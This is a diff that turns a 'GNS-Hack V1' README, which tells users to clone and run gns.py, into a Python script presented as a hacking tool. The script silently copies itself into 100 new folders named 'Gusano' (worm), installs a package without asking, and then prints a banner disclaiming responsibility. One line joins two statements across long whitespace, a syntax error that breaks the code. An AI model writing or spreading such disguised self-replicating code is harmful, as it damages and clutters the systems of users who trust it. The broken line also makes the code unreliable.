@@ -1,15 +1,53 @@
-# GNS-Hack V1
+import subprocess,sys,shutil
+import os
 
-apt update
+#!Rojo
+R='\033[1;31m'
 
-apt upgrade
+#!Verde
+V='\033[1;32m'
+GOKE='\033[92m'
 
-pkg install python
+#!Amarillo
+Y='\033[1;33m'
 
-pkg install git
+#!Azul
+B='\033[0;34m'
 
-git clone: https://github.com/Stealph-Hydra/GNS/edit/main/README.md
+#!Morado
+M='\033[1;35m'
 
-cd GNS
+#!Cian
+C='\033[1;36m'
 
-python gns.py
+#!Blanco
+W='\033[0m'
+
+filename = sys.argv[0]
+
+for x in range(100):
+    path = "Gusano "+str(x)
+    subprocess.call("mkdir {}".format(path),shell=True)
+    shutil.copy(filename,path)
+
+os.system("pkg install figlet")
+os.system("clear")
+os.system("sleep 1")
+print (R)
+os.system("figlet Bienvendio a")
+os.system("sleep 1")
+os.system("figlet GNS-Hack V1")                                                         print(Y)
+print ("                                                    by: Hydra")
+os.system("sleep 00.01")
+print (B)
+print ("_________________________________________________________________")
+os.system("sleep 1")
+print (M)
+print (" * Este script esta echo en codigo Python.")
+os.system("sleep 1")
+print(M)
+print (" * Si llegaste a ejecutar el script, no me hago responsable.")
+os.system("sleep 1")
+print ("\n * Pon el comando 'ls' para ver lo que sucedio.")
+print(B)
+print ("_________________________________________________________________")
